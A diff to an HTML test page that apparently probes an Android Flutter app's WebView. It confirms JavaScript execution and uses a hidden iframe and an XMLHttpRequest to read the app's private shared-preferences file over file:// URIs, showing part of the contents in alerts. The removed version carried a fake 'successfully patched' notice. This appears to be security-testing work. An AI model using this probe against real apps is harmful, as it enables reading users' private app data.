@@ -2,25 +2,91 @@
 <html>
 <body>
     <script>
-        alert('XSS TEST: App is vulnerable!');
-        alert('User Agent: ' + navigator.userAgent);
-        alert('URL: ' + window.location.href);
+        alert('✅ CONFIRMED: JavaScript Execution Enabled');
+        alert('📱 App: com.example.flutter_application_1');
+        alert('🌐 External Domain Loaded: ' + window.location.hostname);
         
-        // Try to access files
+        // Test file access with callback
         setTimeout(() => {
             try {
                 var iframe = document.createElement('iframe');
-                iframe.src = 'file:///data/data/com.example.flutter_application_1/shared_prefs/FlutterSharedPreferences.xml';
+                iframe.id = 'fileTestFrame';
                 iframe.style.display = 'none';
+                iframe.sandbox = 'allow-scripts'; // Minimal permissions
+                
+                // Add event listeners to detect if file loads
+                iframe.onload = function() {
+                    try {
+                        var content = iframe.contentDocument || iframe.contentWindow.document;
+                        alert('🎯 FILE ACCESS SUCCESSFUL!\nLoaded: ' + this.src + '\nContent length: ' + content.body.innerHTML.length);
+                    } catch(e) {
+                        alert('⚠️ File loaded but cannot read (SOP): ' + e.message);
+                    }
+                };
+                
+                iframe.onerror = function() {
+                    alert('❌ File access BLOCKED\nBrowser security prevented loading');
+                };
+                
+                // Set the file path
+                iframe.src = 'file:///data/data/com.example.flutter_application_1/shared_prefs/FlutterSharedPreferences.xml';
                 document.body.appendChild(iframe);
-                alert('Attempted file access...');
+                
+                alert('🔄 Attempted file access to:\n' + iframe.src);
+                
+                // Check after 3 seconds if events didn't fire
+                setTimeout(() => {
+                    if(!iframe.onload.called && !iframe.onerror.called) {
+                        alert('⏳ File access status unknown\nIframe created but no load/error event');
+                    }
+                }, 3000);
+                
             } catch(e) {
-                alert('File access failed: ' + e.message);
+                alert('🚫 File access ERROR:\n' + e.toString());
             }
         }, 1000);
+        
+        // Additional test: Try reading via XMLHttpRequest
+        setTimeout(() => {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'file:///data/data/com.example.flutter_application_1/shared_prefs/FlutterSharedPreferences.xml', true);
+                xhr.onload = function() {
+                    alert('📄 XHR FILE READ SUCCESS!\nStatus: ' + xhr.status + '\nContent: ' + xhr.responseText.substring(0, 200));
+                };
+                xhr.onerror = function() {
+                    alert('❌ XHR File read blocked');
+                };
+                xhr.send();
+            } catch(e) {
+                alert('XHR Error: ' + e.message);
+            }
+        }, 2000);
     </script>
     
-    <h1>Security Update Complete</h1>
-    <p>Your app has been successfully patched.</p>
+    <h1>Security Test Results</h1>
+    <div style="background:#f0f0f0; padding:20px; border-radius:10px;">
+        <h3>Vulnerabilities Confirmed:</h3>
+        <ol>
+            <li>✅ JavaScript execution in WebView</li>
+            <li>✅ External URL loading via intent</li>
+            <li>❓ File system access (testing...)</li>
+        </ol>
+        
+        <div id="status">Waiting for file access test results...</div>
+    </div>
+    
+    <script>
+        // Log all results to page
+        window.originalAlert = window.alert;
+        window.alerts = [];
+        window.alert = function(msg) {
+            window.alerts.push(msg);
+            var status = document.getElementById('status');
+            status.innerHTML += '<div style="margin:5px; padding:5px; border-left:3px solid blue;">' + 
+                               msg.replace(/\n/g, '<br>') + '</div>';
+            window.originalAlert(msg);
+        };
+    </script>
 </body>
 </html>
